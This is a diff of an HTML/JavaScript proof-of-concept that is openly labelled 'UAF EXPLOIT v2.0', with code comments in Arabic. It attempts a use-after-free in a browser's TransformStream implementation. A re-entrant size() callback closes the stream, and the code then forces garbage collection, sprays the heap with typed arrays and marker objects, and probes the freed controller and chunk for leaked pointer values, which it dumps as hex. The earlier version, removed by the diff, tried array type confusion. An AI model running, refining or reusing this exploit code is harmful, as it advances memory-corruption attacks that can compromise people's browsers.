@@ -2,12 +2,13 @@
 <html>
 <head>
 <style>
-body { background: black; color: lime; font-family: monospace; font-size: 16px; padding: 10px; }
+body { background: black; color: lime; font-family: monospace; font-size: 14px; padding: 10px; }
 .log { white-space: pre-wrap; word-break: break-all; }
 .ok { color: lime; }
 .err { color: red; }
 .warn { color: yellow; }
 .info { color: cyan; }
+.hit { color: magenta; font-weight: bold; }
 </style>
 </head>
 <body>
@@ -20,127 +21,187 @@ function log(msg, cls) {
     document.getElementById("log").appendChild(d);
 }
 
-log("=== UAF EXPLOIT v1.0 ===", "info");
-log("Target: TransformStream Type Confusion + UAF", "info");
+log("=== UAF EXPLOIT v2.0 ===", "info");
+log("Goal: Reclaim freed memory + Info Leak", "info");
 log("");
 
-// Step 1: Create arrays for type confusion
-log("[1] Creating arrays...", "ok");
-
-let boxed = [{}];      // Boxed array (holds objects)
-let unboxed = [1.1];   // Unboxed array (holds doubles)
-
-log("  boxed: " + typeof boxed[0], "ok");
-log("  unboxed: " + typeof unboxed[0], "ok");
-log("");
-
-// Step 2: Setup the UAF inside size()
-log("[2] Setting up UAF trap...", "ok");
-
-let phase = 0;
-let leaked = 0;
 let writer;
+let controller;
+let phase = 0;
+let leakedValues = [];
 
 let sizeFunc = function(chunk) {
-    log("  [size] Called! phase=" + phase, "warn");
-
     if (phase === 0) {
         phase = 1;
-        // Close the stream - this frees internal structures
+        log("[size] Phase 1: Closing stream...", "warn");
+
+        // 1. أغلق الـ Stream (يحرر الكائنات الداخلية)
         try {
             writer.close();
-            log("  [size] writer.close() OK", "ok");
+            log("[size] close() OK", "ok");
         } catch(e) {
-            log("  [size] close err: " + e.message, "err");
+            log("[size] close err: " + e.message, "err");
         }
 
-        // Try to reclaim the freed memory
-        // Fill the gap with our controlled data
+        // 2. حرّض GC لتحرير الكائنات فوراً
+        log("[size] Triggering GC...", "warn");
+        for (let i = 0; i < 10000; i++) {
+            let tmp = { a: i, b: i * 2, c: i * 3 };
+        }
+
+        // 3. رش ذاكرة بأحجام مختلفة
+        log("[size] Spraying heap...", "warn");
+
+        // رش بـ Float64Array (64 بايت لكل عنصر)
+        let spray1 = [];
+        for (let i = 0; i < 100; i++) {
+            spray1.push(new Float64Array(8)); // 64 bytes
+        }
+
+        // رش بـ ArrayBuffer (أحجام مختلفة)
+        let spray2 = [];
+        for (let i = 0; i < 100; i++) {
+            spray2.push(new ArrayBuffer(64));  // 64 bytes
+            spray2.push(new ArrayBuffer(128)); // 128 bytes
+            spray2.push(new ArrayBuffer(256)); // 256 bytes
+        }
+
+        // رش بكائنات عادية (تحتوي على مؤشرات)
+        let spray3 = [];
+        for (let i = 0; i < 100; i++) {
+            spray3.push({
+                a: 0x41414141,
+                b: 0x42424242,
+                c: 0x43434343,
+                d: 0x44444444,
+                e: 0x45454545,
+                f: 0x46464646,
+                g: 0x47474747,
+                h: 0x48484848
+            });
+        }
+
+        log("[size] Spray complete", "ok");
+
+        // 4. حاول الوصول إلى controller المحرر
+        log("[size] Checking controller...", "warn");
         try {
-            // Spray heap with controlled objects
-            for (let i = 0; i < 100; i++) {
-                boxed[i] = {};
+            if (controller) {
+                let props = Object.getOwnPropertyNames(controller);
+                log("[size] Controller props: " + props.join(", "), "warn");
+
+                // اقرأ كل خاصية
+                for (let p of props) {
+                    try {
+                        let val = controller[p];
+                        log("[size] controller." + p + " = " + val + " (type: " + typeof val + ")", "warn");
+
+                        // إذا كانت قيمة غريبة (رقم كبير أو NaN)
+                        if (typeof val === 'number' && (val > 1e10 || isNaN(val) || val < 0)) {
+                            log("[size] >>> ANOMALY DETECTED! <<<", "hit");
+                            leakedValues.push({ prop: p, value: val });
+                        }
+                    } catch(e) {
+                        log("[size] controller." + p + " ERR: " + e.message, "err");
+                    }
+                }
             }
-            log("  [size] Heap spray done", "ok");
         } catch(e) {
-            log("  [size] spray err: " + e.message, "err");
+            log("[size] Controller access failed: " + e.message, "err");
+        }
+
+        // 5. حاول قراءة chunk (قد يكون محرراً)
+        log("[size] Checking chunk...", "warn");
+        try {
+            log("[size] chunk type: " + typeof chunk, "warn");
+            log("[size] chunk value: " + chunk, "warn");
+
+            // إذا كان chunk كائناً، اقرأ خصائصه
+            if (chunk && typeof chunk === 'object') {
+                let cProps = Object.getOwnPropertyNames(chunk);
+                log("[size] chunk props: " + cProps.join(", "), "warn");
+            }
+        } catch(e) {
+            log("[size] chunk ERR: " + e.message, "err");
         }
     }
 
     return 1;
 };
 
-// Step 3: Create TransformStream with size trap
-log("[3] Creating TransformStream...", "ok");
+log("[1] Creating TransformStream...", "ok");
 
 try {
     let stream = new TransformStream(
-        { transform: (c, ctrl) => ctrl.enqueue(c) },
+        {
+            transform: (c, ctrl) => {
+                controller = ctrl; // احفظ المرجع
+                ctrl.enqueue(c);
+            }
+        },
         { highWaterMark: 1, size: sizeFunc },
         { highWaterMark: 1, size: sizeFunc }
     );
 
     writer = stream.writable.getWriter();
-    log("  Stream created OK", "ok");
+    log("[2] Stream created, writer ready", "ok");
 
-    // Step 4: Write to trigger size()
-    log("[4] Writing to trigger size()...", "ok");
+    // اكتب لتشغيل size() + transform()
+    log("[3] Writing 'AAAA'...", "ok");
 
     writer.write("AAAA").then(() => {
-        log("[5] Write succeeded!", "ok");
-
-        // Check if arrays are corrupted
-        log("[6] Checking arrays...", "warn");
-        log("  boxed[0]: " + boxed[0], "ok");
-        log("  unboxed[0]: " + unboxed[0], "ok");
-
-        // Try reading boxed as unboxed (type confusion)
-        try {
-            let val = unboxed[0];
-            log("  unboxed[0] value: " + val, "warn");
-
-            // If val is a pointer (large number), we have a leak!
-            if (val > 1e10 || val < 0 || isNaN(val)) {
-                log("  >>> POSSIBLE POINTER LEAK! <<<", "err");
-                log("  >>> VALUE: " + val + " <<<", "err");
-
-                // Convert to hex
-                let buf = new ArrayBuffer(8);
-                let view = new Float64Array(buf);
-                view[0] = val;
-                let hex = "";
-                let bytes = new Uint8Array(buf);
-                for (let i = 0; i < 8; i++) {
-                    hex += bytes[i].toString(16).padStart(2,'0') + " ";
-                }
-                log("  >>> HEX: " + hex + " <<<", "err");
-            } else {
-                log("  No leak detected (value too small)", "warn");
-            }
-        } catch(e) {
-            log("  Read err: " + e.message, "err");
-        }
-
+        log("[4] Write OK", "ok");
     }).catch((e) => {
-        log("[5] Write error: " + e.message, "warn");
-        log("  (This is expected if UAF occurred)", "warn");
-
-        // Even on error, check arrays
-        log("[6] Checking arrays after error...", "warn");
-        try {
-            log("  boxed[0]: " + boxed[0], "ok");
-            log("  unboxed[0]: " + unboxed[0], "ok");
-        } catch(e2) {
-            log("  Array read failed: " + e2.message, "err");
-        }
+        log("[4] Write error: " + e.message, "warn");
     });
 
-} catch(e) {
-    log("[3] Stream creation error: " + e.message, "err");
-}
+    // بعد فترة قصيرة، حاول القراءة من readable
+    setTimeout(() => {
+        log("[5] Trying to read from readable...", "ok");
 
-log("");
-log("=== DONE ===", "info");
+        try {
+            let reader = stream.readable.getReader();
+            log("[5] Reader created", "ok");
+
+            reader.read().then((result) => {
+                log("[5] Read result: " + JSON.stringify(result), "ok");
+
+                if (result.value) {
+                    // تحقق من القيم المسربة
+                    let buf = new ArrayBuffer(8);
+                    let view = new Float64Array(buf);
+                    view[0] = result.value;
+
+                    let bytes = new Uint8Array(buf);
+                    let hex = "";
+                    for (let i = 0; i < 8; i++) {
+                        hex += bytes[i].toString(16).padStart(2,'0') + " ";
+                    }
+                    log("[5] Read hex: " + hex, "hit");
+                }
+            }).catch((e) => {
+                log("[5] Read error: " + e.message, "warn");
+            });
+        } catch(e) {
+            log("[5] Reader error: " + e.message, "err");
+        }
+
+        // تحقق من leakedValues
+        if (leakedValues.length > 0) {
+            log("", "");
+            log(">>> LEAKED VALUES <<<", "hit");
+            for (let lv of leakedValues) {
+                log("  " + lv.prop + " = " + lv.value, "hit");
+            }
+        }
+
+        log("", "");
+        log("=== DONE ===", "info");
+    }, 500);
+
+} catch(e) {
+    log("[1] Stream creation error: " + e.message, "err");
+}
 </script>
 </body>
 </html>
